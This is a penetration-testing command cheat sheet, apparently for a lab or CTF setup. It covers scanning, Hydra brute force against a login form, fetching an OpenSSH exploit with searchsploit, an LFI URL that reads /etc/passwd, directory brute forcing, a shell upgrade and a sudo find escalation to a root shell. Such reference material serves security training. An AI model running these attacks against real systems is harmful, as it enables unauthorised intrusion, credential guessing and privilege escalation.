# Commands Reference

> **Permission reminder:** Only run these commands on systems and networks you own or have explicit permission to test.

---

## Scanning & help

```bash
nmap --help
```

*Show Nmap help / usage.*

```bash
nmap -sV 192.168.100.100
```

*Service/version detection scan against `192.168.100.100`.*

---

## Sockets / listening services

```bash
ss -nltp
```

*List listening TCP sockets with numeric addresses and process info.*

---

## Network discovery

```bash
netdiscover -i eth0 -r 192.168.56.0/24
```

*ARP sweep on `192.168.56.0/24` via interface `eth0`.*

---

## Wordlists & wordlist tools

```text
/usr/share/wordlists
```

*Common wordlists path (Debian/Kali/Parrot).*

```bash
unzip rockyou
```

*Unzip the `rockyou` archive (adjust filename/path as needed).*

---

## Brute-forcing (Hydra)

```bash
hydra -P ./sqlinject.txt -L ./sqlinject 192.168.100.20 http-post-form '/login.php:login=^USER^&senha=^PASS^:incorreto' -I
```

*Hydra HTTP POST brute force against `192.168.100.20`.*

```bash
hydra -P ./sqlinject.txt -L ./sqlinject localhost -s 9090 http-post-form '/login.php:login=^USER^&senha=^PASS^:incorreto' -I
```

*Same Hydra attack targeting `localhost` on port `9090`.*

---

## SSH tunnels / port forwarding

```bash
ssh -i ~/.ssh/reverse_id_ed25519 -L 127.0.0.1:9090:localhost:9000 ckp_06@192.168.56.109
```

*Local port forward: binds `127.0.0.1:9090` on your machine to `localhost:9000` on the remote after connecting.*

---

## Exploit / search tools

```bash
searchsploit OpenSSH
```

*Search local Exploit-DB mirror for `OpenSSH` entries.*

```bash
searchsploit -m linux/remote/45233.py
```

*Copy the exploit `linux/remote/45233.py` to the current directory.*

---

## Raw HTTP / netcat

```bash
printf "GET / HTTP/1.0\r\n\r\n" | nc -v 192.168.56.102 80
```

*Send a raw HTTP GET to `192.168.56.102:80` using netcat (verbose).*

---

## Web resources & example URLs

```text
https://portswigger.net/web-security
```

*PortSwigger Web Security Academy — reference/training material.*

```text
http://192.168.56.102/bWAPP/rlfi.php?language=../../../etc/passwd
```

*Example LFI/RLFI URL attempting to read `/etc/passwd`.*

---

## Web content discovery (gobuster)

```bash
gobuster dir -u 192.168.56.102 -w /usr/share/wordlists/dirb/big.txt
```

*Directory brute force against `192.168.56.102`.*

```bash
gobuster dir -u 192.168.56.102 -w /usr/share/wordlists/dirb/big.txt -x php,html,txt
```

*Same but try `php`, `html`, `txt` extensions.*

---

## Interactive / shell helpers

```bash
python3 -c "import pty;pty.spawn('bin/bash')"
```

*Spawn a pseudo-TTY shell (useful after getting a limited shell).*

---

## Privilege enumeration / escalation helpers

```bash
sudo -l
```

*List allowed `sudo` commands for the current user.*

```text
https://gtfobins.github.io/
```

*GTFOBins — collection of Unix binaries that can be abused for privilege escalation.*

```bash
# example with find:
sudo find . -exec /bin/sh \; -quit
```

*Example `find`-based escalation: runs `/bin/sh` via `sudo find` (only works if `find` allowed via sudo).*

---

## Notes

* Use these commands responsibly and legally.
* Consider adding `-v` or `-vv` to debug verbose output for tools like `ssh`, `nmap`, `hydra`, and `gobuster`.
* Adjust paths, interfaces, hosts and filenames for your environment.

---
